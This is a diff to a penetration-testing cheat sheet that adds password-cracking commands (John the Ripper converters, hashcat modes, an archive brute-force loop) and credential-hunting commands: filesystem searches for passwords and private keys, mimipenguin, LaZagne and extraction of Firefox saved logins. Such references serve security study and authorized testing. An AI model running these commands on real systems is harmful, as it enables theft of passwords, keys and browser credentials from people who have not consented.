@@ -589,6 +589,7 @@ $ ssh -D 1234 <username>@<remote IP address>
 
 ```
 Edit /etc/proxychains4.conf
+Edit [ProxyList] e.g. 127.0.0.1 9050
 $ proxychains <command>
 ```
 
@@ -806,6 +807,7 @@ $ hashid <hash>
 - John The Ripper
 
 ```
+$ unshadow passwd.txt shadow.txt > unshadowed.txt
 $ john -w=/usr/share/wordlists/rockyou.txt hash.txt
 $ john --show hashes.txt
 ```
@@ -824,11 +826,50 @@ $ hydra -C <user_pass.txt> ssh://<IP address>
 $ zip2john <ZIP file> > hashes.txt
 ```
 
+- Ssh2john
+
+```
+$ python3 ssh2john.py <SSH-private-keys.txt> > ssh.hash
+$ john --show ssh.hash
+```
+
+- Office2john
+
+```
+$ office2john.py Protected.docx > protected-docx.hash
+$john --wordlist=<wordlist> protected-docx.hash
+```
+
+- Pdf2john
+
+```
+$ pdf2john.pl PDF.pdf > pdf.hash
+$ john --wordlist=<wordlist> pdf.hash	
+```
+
+- Bitlocker2john
+
+```
+$ bitlocker2john -i Backup.vhd > backup.hashes
+```
+
 - Hashcat
 
 ```
 $ hashcat --force password.list -r custom.rule --stdout > mut_password.list
 $ hashcat -a 0 -m 0 hashes.txt <wordlist>
+$ hashcat -m 1000 ntlm-hashes.txt <wordlist>
+$ hashcat -m 1000 <ntlm-hash> <wordlist> --show
+$ hashcat -m 1800 -a 0 unshadowed.txt <wordlist> -o /tmp/unshadowed.cracked
+$ hashcat -m 500 -a 0 md5-hashes.txt <wordlist>
+$ hashcat -m 22100 bitlocker-hashes.txt <wordlist> -o backup.cracked
+```
+
+- Archive Cracking
+
+```
+$ file GZIP.gzip
+$ for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null | tar xz;done
 ```
 
 #7. - Password Dumping
@@ -894,6 +935,59 @@ $ pypykatz lsa minidump lsass.dmp
 
 ```
 $ python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
+```
+
+- For Loops
+
+```
+$ for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib|fonts|share|core" ;done
+$ for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc|lib");do echo -e "\nFile: " $i; grep "user|password|pass" $i 2>/dev/null | grep -v "\#";done
+$ for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc|lib|headers|share|man";done
+$ find /home/* -type f -name "*.txt" -o ! -name "*.*"
+$ for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc|lib|headers|share";done
+$ for ext in $(echo ".xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib|fonts|share|core" ;done
+```
+
+- Grep
+
+```
+$ grep -rnw "PRIVATE KEY" /* 2>/dev/null | grep ":1"
+$ grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"
+$ grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"
+```
+
+- Cron
+
+```
+$ cat /etc/crontab
+$ ls -la /etc/cron.*/
+```
+
+- Mimipenguin
+
+```
+$ python3 mimipenguin.py
+$ bash mimipenguin.sh
+```
+
+- Lazange
+
+```
+$ python2.7 lazagne.py all
+$ python3 lazagne.py browsers
+```
+
+- Firefox Credentials
+
+```
+$ ls -l .mozilla/firefox/ | grep default
+$ cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
+```
+
+- Firefox_decrypt
+
+```
+$ python3.9 firefox_decrypt.py
 ```
 
 #8. - File Transfers
